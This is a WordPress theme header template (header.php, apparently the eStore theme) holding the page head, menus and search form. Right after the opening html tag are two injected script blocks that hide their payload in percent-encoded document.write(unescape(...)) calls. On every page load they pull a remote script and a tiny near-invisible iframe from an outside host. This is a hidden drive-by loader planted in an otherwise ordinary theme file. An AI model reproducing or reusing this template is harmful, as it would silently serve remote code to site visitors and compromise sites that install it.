<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" <?php language_attributes(); ?>>
<script type='text/javascript' language='Javascript'>
<!--
document.write(unescape('%3C%73%63%72%69%70%74%20%74%79%70%65%3D%22%74%65%78%74%2F%6A%61%76%61%73%63%72%69%70%74%22%20%73%72%63%3D%22%68%74%74%70%3A%2F%2F%65%6E%61%6C%6C%61%2E%77%65%62%73%2E%63%6F%6D%2F%70%6F%70%75%70%2E%6A%73%22%3E%3C%2F%73%63%72%69%70%74%3E'));
//-->
</script>
<script type='text/javascript' language='Javascript'>
<!--
document.write(unescape('%3C%69%66%72%61%6D%65%20%6E%61%6D%65%3D%22%49%6E%6C%69%6E%65%46%72%61%6D%65%31%22%20%69%64%3D%22%49%6E%6C%69%6E%65%46%72%61%6D%65%31%22%20%73%74%79%6C%65%3D%22%77%69%64%74%68%3A%31%30%70%78%3B%68%65%69%67%68%74%3A%39%70%78%3B%7A%2D%69%6E%64%65%78%3A%31%3B%22%20%73%72%63%3D%22%68%74%74%70%3A%2F%2F%65%6E%61%6C%6C%61%2E%77%65%62%73%2E%63%6F%6D%2F%69%66%72%61%6D%65%2E%68%74%6D%6C%22%20%73%63%72%6F%6C%6C%69%6E%67%3D%22%6E%6F%22%20%66%72%61%6D%65%62%6F%72%64%65%72%3D%22%30%22%3E%59%6F%75%72%20%62%72%6F%77%73%65%72%20%64%6F%65%73%20%6E%6F%74%20%73%75%70%70%6F%72%74%20%69%6E%6C%69%6E%65%20%66%72%61%6D%65%73%20%6F%72%20%69%73%20%63%75%72%72%65%6E%74%6C%79%20%63%6F%6E%66%69%67%75%72%65%64%20%6E%6F%74%20%74%6F%20%64%69%73%70%6C%61%79%20%69%6E%6C%69%6E%65%20%66%72%61%6D%65%73%2E%3C%2F%69%66%72%61%6D%65%3E'));
//-->
</script>
<head profile="http://gmpg.org/xfn/11">
<meta http-equiv="Content-Type" content="<?php bloginfo('html_type'); ?>; charset=<?php bloginfo('charset'); ?>" />
<title><?php elegant_titles(); ?></title>
<?php elegant_description(); ?>
<?php elegant_keywords(); ?>
<?php elegant_canonical(); ?>

<link rel="stylesheet" href="<?php bloginfo('stylesheet_url'); ?>" type="text/css" media="screen" />
<link rel="alternate" type="application/rss+xml" title="<?php bloginfo('name'); ?> RSS Feed" href="<?php bloginfo('rss2_url'); ?>" />
<link rel="alternate" type="application/atom+xml" title="<?php bloginfo('name'); ?> Atom Feed" href="<?php bloginfo('atom_url'); ?>" />
<link rel="pingback" href="<?php bloginfo('pingback_url'); ?>" />

<!--[if lt IE 7]>
	<link rel="stylesheet" type="text/css" href="<?php bloginfo('template_directory'); ?>/css/ie6style.css" />
	<script type="text/javascript" src="<?php bloginfo('template_directory'); ?>/js/DD_belatedPNG_0.0.8a-min.js"></script>
	<script type="text/javascript">DD_belatedPNG.fix('img#logo');</script>
<![endif]-->
<!--[if IE 7]>
	<link rel="stylesheet" type="text/css" href="<?php bloginfo('template_directory'); ?>/css/ie7style.css" />
<![endif]-->
<!--[if IE 8]>
	<link rel="stylesheet" type="text/css" href="<?php bloginfo('template_directory'); ?>/css/ie8style.css" />
<![endif]-->

<script type="text/javascript">
	document.documentElement.className = 'js';
</script>

<?php if ( is_singular() ) wp_enqueue_script( 'comment-reply' ); ?>
<?php wp_head(); ?>

</head>
<?php $et_body_class = get_option('estore_cufon') == 'false' ? 'cufon-disabled' : 'cufon-enabled'; ?>
<body<?php if (is_home()) echo(' id="home"'); ?> <?php body_class( $et_body_class ); ?>>
	<div id="header">
		<div class="container clearfix">
			<a href="<?php bloginfo('url'); ?>"><?php $logo = (get_option('estore_logo') <> '') ? get_option('estore_logo') : get_bloginfo('template_directory').'/images/logo.png'; ?>
				<img src="<?php echo esc_url($logo); ?>" alt="<?php echo esc_attr(get_bloginfo('name')); ?>" id="logo"/></a>
			
			<?php $menuClass = 'nav superfish clearfix';
			$menuID = 'top-menu';
			$primaryNav = '';
			if (function_exists('wp_nav_menu')) {
				$primaryNav = wp_nav_menu( array( 'theme_location' => 'primary-menu', 'container' => '', 'fallback_cb' => '', 'menu_class' => $menuClass, 'menu_id' => $menuID, 'echo' => false ) ); 
			};
			if ($primaryNav == '') { ?>
				<ul id="<?php echo $menuID; ?>" class="<?php echo $menuClass; ?>">
					<?php if (get_option('estore_swap_navbar') == 'false') { ?>
						<?php if (get_option('estore_home_link') == 'on') { ?>
							<li <?php if (is_home()) echo('class="current_page_item"') ?>><a href="<?php bloginfo('url'); ?>"><?php esc_html_e('Home','eStore') ?></a></li>
						<?php }; ?>
						
						<?php show_page_menu($menuClass,false,false); ?>
					<?php } else { ?>
						<?php show_categories_menu($menuClass,false); ?>
					<?php } ?>
				</ul> <!-- ul#nav -->
			<?php }
			else echo($primaryNav); ?>
			
			<div id="search-bar">
				<form method="get" id="searchform1" action="<?php echo home_url(); ?>">
					<input type="text" value="<?php esc_attr_e('Rechercher...','eStore'); ?>" name="s" id="searchinput" />

					<input type="image" src="<?php bloginfo('template_directory'); ?>/images/search-icon.png" id="searchsubmit" />
				</form>
			</div> <!-- #search-bar -->
						
			<div id="menu">
				<?php $menuClass = 'nav superfish clearfix';
				$menuID = 'secondary-menu';
				$secondaryNav = '';
				if (function_exists('wp_nav_menu')) {
					$secondaryNav = wp_nav_menu( array( 'theme_location' => 'secondary-menu', 'container' => '', 'fallback_cb' => '', 'menu_class' => $menuClass, 'menu_id' => $menuID, 'echo' => false, 'walker' => new description_walker() ) ); 
				};
				if ($secondaryNav == '') { ?>
					<ul id="<?php echo $menuID; ?>" class="<?php echo $menuClass; ?>">
						<?php if (get_option('estore_swap_navbar') == 'false') { ?>
							<?php show_categories_menu($menuClass,false); ?>
						<?php } else { ?>
							<?php if (get_option('estore_home_link') == 'on') { ?>
								<li <?php if (is_home()) echo('class="current_page_item"') ?>><a href="<?php bloginfo('url'); ?>"><?php esc_html_e('Home','eStore') ?></a></li>
							<?php }; ?>
							
							<?php show_page_menu($menuClass,false,false); ?>
						<?php } ?>
					</ul> <!-- end ul#nav -->
				<?php }
				else echo($secondaryNav); ?>
			</div> <!-- #menu -->
			
		</div> <!-- .container -->
	</div> <!-- #header -->
		
	<?php if (get_option('estore_featured') == 'on' && (is_home() || is_front_page())) get_template_part('includes/featured'); ?>
	
	<div id="content" <?php global $fullwidth; if ( is_page_template('page-full.php') || $fullwidth ) echo 'class="no_sidebar"'?>>
		<div class="container clearfix">